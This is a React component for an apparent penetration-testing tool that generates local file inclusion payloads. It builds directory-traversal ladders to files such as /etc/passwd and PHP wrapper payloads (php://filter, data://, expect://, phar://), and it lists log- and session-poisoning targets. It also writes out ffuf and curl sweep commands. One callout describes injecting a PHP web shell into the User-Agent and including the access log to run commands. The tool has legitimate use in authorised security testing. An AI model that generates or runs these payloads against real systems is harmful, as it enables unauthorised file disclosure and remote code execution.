import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  CodeBlock,
  CopyChip,
  DownloadButton,
  KVTable,
  NumberInput,
  SectionTitle,
  Select,
  TextInput,
} from '@/components/ui';
import { LFI_TARGETS, lfiVariants } from '@/lib/redteam-data';
import { DEFAULT_TARGET } from '@/tools/registry';

type Os = 'linux' | 'windows';

const WRAPPERS: Array<{ id: string; label: string; note: string; build: (path: string) => string }> = [
  { id: 'b64', label: 'php://filter base64', note: 'Encodes source so PHP chrome is not parsed', build: (p) => `php://filter/convert.base64-encode/resource=${p}` },
  { id: 'rot13', label: 'php://filter rot13', note: 'Alternative encode chain for blocked base64', build: (p) => `php://filter/read=string.rot13/resource=${p}` },
  { id: 'iconv', label: 'php://filter iconv', note: 'UTF-8 → UTF-7 chunk chain; useful when base64 is blocked', build: (p) => `php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=${p}` },
  { id: 'data', label: 'data://', note: 'Only works with allow_url_include=On', build: () => 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b' },
  { id: 'expect', label: 'expect://', note: 'Requires the expect extension', build: () => 'expect://id' },
  { id: 'zip', label: 'zip://', note: 'Point at an uploaded archive to execute a member', build: () => `zip:///uploads/archive.zip%23payload.txt` },
  { id: 'phar', label: 'phar://', note: 'Triggers unserialisation on the phar manifest', build: () => `phar:///uploads/payload.phar/x` },
];

const POISONING: Array<{ id: string; label: string; note: string; build: (p: string) => string[] }> = [
  { id: 'log', label: 'Log poisoning', note: 'Write <?php …?> into the UA, then read the access log', build: () => ['/var/log/apache2/access.log', '/var/log/nginx/access.log', '/var/log/httpd/access_log'] },
  { id: 'environ', label: '/proc/self/environ', note: 'Payload travels in the User-Agent — no write primitive needed', build: () => ['/proc/self/environ'] },
  { id: 'session', label: 'Session file', note: 'php-session upload progress / a predictable PHPSESSID', build: () => ['/tmp/sess_SESSION_ID', '/var/lib/php/sessions/sess_SESSION_ID'] },
  { id: 'authlog', label: 'SSH auth log', note: 'Username field is logged verbatim', build: () => ['/var/log/auth.log', '/var/log/secure'] },
];

/** Depth-graded traversal from the current include root. */
function traversal(depth: number, path: string, os: Os): string {
  const clean = path.replace(/^[\\/]+/, '').replace(/\//g, os === 'windows' ? '\\' : '/');
  const step = os === 'windows' ? '..\\' : '../';
  return `${step.repeat(Math.max(1, depth))}${clean}`;
}

export default function LfiPathGenerator() {
  const [path, setPath] = useState('/etc/passwd');
  const [depth, setDepth] = useState(5);
  const [os, setOs] = useState<Os>('linux');
  const [wrappers, setWrappers] = useState<string[]>(['b64', 'iconv']);
  const [poison, setPoison] = useState<string[]>(['log']);
  const [param, setParam] = useState('page');

  const corpus = useMemo(() => {
    const target = path.trim() || '/etc/passwd';
    const groups: Array<{ title: string; items: string[] }> = [];

    const ladder: string[] = [];
    for (let d = 1; d <= Math.max(1, depth); d++) ladder.push(traversal(d, target, os));
    groups.push({ title: `Traversal ladder (1–${Math.max(1, depth)})`, items: ladder });

    groups.push({ title: 'Alternate encodings', items: lfiVariants(target) });

    if (wrappers.length) {
      groups.push({
        title: 'PHP wrappers',
        items: wrappers.map((id) => WRAPPERS.find((w) => w.id === id)!.build(target)),
      });
    }
    if (poison.length) {
      groups.push({
        title: 'Poisoning targets',
        items: poison.flatMap((id) => POISONING.find((p) => p.id === id)!.build(target)),
      });
    }
    // Depth-limited traversal to a fixed absolute root, useful when the include is relative.
    const depthLimited = Array.from({ length: Math.min(4, Math.max(1, depth)) }, (_, i) => `${'../'.repeat(i + 1)}${target}`);
    groups.push({ title: 'Relative include roots', items: depthLimited });
    return groups;
  }, [path, depth, os, wrappers, poison]);

  const flat = corpus.map((g) => [`# ${g.title}`, ...g.items, ''].join('\n')).join('\n');
  const url = `https://${DEFAULT_TARGET}/?${param.trim() || 'page'}=`;

  const toggle = (setter: (fn: (p: string[]) => string[]) => void) => (id: string, on: boolean) =>
    setter((prev) => (on ? [...prev, id] : prev.filter((x) => x !== id)));

  return (
    <>
      <Card title="Include target">
        <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
          <TextInput label="Target file" value={path} onChange={setPath} mono hint="Default: /etc/passwd" />
          <Select
            label="Operating system"
            value={os}
            onChange={setOs}
            options={[
              { value: 'linux', label: 'Linux / Unix' },
              { value: 'windows', label: 'Windows' },
            ]}
          />
          <NumberInput label="Max traversal depth" value={depth} onChange={setDepth} min={1} max={12} hint="1–12 segments" />
          <TextInput label="Vulnerable parameter" value={param} onChange={setParam} mono />
          <div className="sm:col-span-2">
            <SectionTitle>Common targets</SectionTitle>
            <div className="flex flex-wrap gap-1.5">
              {LFI_TARGETS.filter((t) => (os === 'windows' ? t.includes('\\') : !t.includes('\\')))
                .slice(0, 8)
                .map((t) => (
                  <button
                    key={t}
                    type="button"
                    onClick={() => setPath(t)}
                    className="rf-mono rounded border border-[var(--card-border)] px-1.5 py-0.5 text-[11.5px] text-[var(--text-muted)] transition-colors hover:border-[var(--accent)] hover:text-[var(--accent)]"
                    title={`Use ${t}`}
                  >
                    {t}
                  </button>
                ))}
            </div>
          </div>
        </div>
        <div className="mt-4 grid gap-4 sm:grid-cols-2">
          <div>
            <SectionTitle>PHP wrappers</SectionTitle>
            <div className="flex flex-col gap-2">
              {WRAPPERS.map((w) => (
                <Checkbox key={w.id} checked={wrappers.includes(w.id)} onChange={(on) => toggle(setWrappers)(w.id, on)} label={w.label} description={w.note} />
              ))}
            </div>
          </div>
          <div>
            <SectionTitle>Poisoning vectors</SectionTitle>
            <div className="flex flex-col gap-2">
              {POISONING.map((p) => (
                <Checkbox key={p.id} checked={poison.includes(p.id)} onChange={(on) => toggle(setPoison)(p.id, on)} label={p.label} description={p.note} />
              ))}
            </div>
          </div>
        </div>
      </Card>

      <Card title="Payload corpus" action={<DownloadButton text={flat} filename="lfi-payloads.txt" label="Download .txt" />}>
        <div className="flex flex-col gap-5">
          {corpus.map((g) => (
            <div key={g.title}>
              <SectionTitle right={<span className="text-[11.5px] text-[var(--text-faint)]">{g.items.length}</span>}>{g.title}</SectionTitle>
              <div className="flex flex-col gap-1.5">
                {g.items.map((p, i) => (
                  <CopyChip key={i} text={p} />
                ))}
              </div>
            </div>
          ))}
        </div>
      </Card>

      <Card title="Harness">
        <CodeBlock
          code={[
            `# Sweep the ladder: response length tells you which depth lands`,
            `ffuf -u '${url}FUZZ' -w lfi-payloads.txt -mr 'root:x:0:0' -t 20 -rate 60`,
            ``,
            `# Single confirmation`,
            `curl -sS '${url}${traversal(depth, path.trim() || '/etc/passwd', os)}' | head -5`,
          ].join('\n')}
          label="ffuf / curl"
        />
        <div className="mt-4">
          <KVTable
            rows={[
              ['Depth selected', `${depth} segment(s)`],
              ['Separator', os === 'windows' ? '..\\' : '../'],
              ['Wrappers', wrappers.length ? wrappers.join(', ') : 'none'],
              ['Poisoning', poison.length ? poison.join(', ') : 'none'],
            ]}
          />
        </div>
        <div className="mt-4">
          <Callout tone="info" title="Log poisoning loop">
            Write <span className="rf-mono">{'<?php echo "RF"; system($_GET["c"]); ?>'}</span> into the User-Agent, request
            any page so it lands in the access log, then include the log with{' '}
            <span className="rf-mono">{param || 'page'}=…/…/var/log/apache2/access.log&amp;c=id</span>. The inclusion must be
            the last parameter so the added query string is not swallowed by the include.
          </Callout>
        </div>
      </Card>
    </>
  );
}
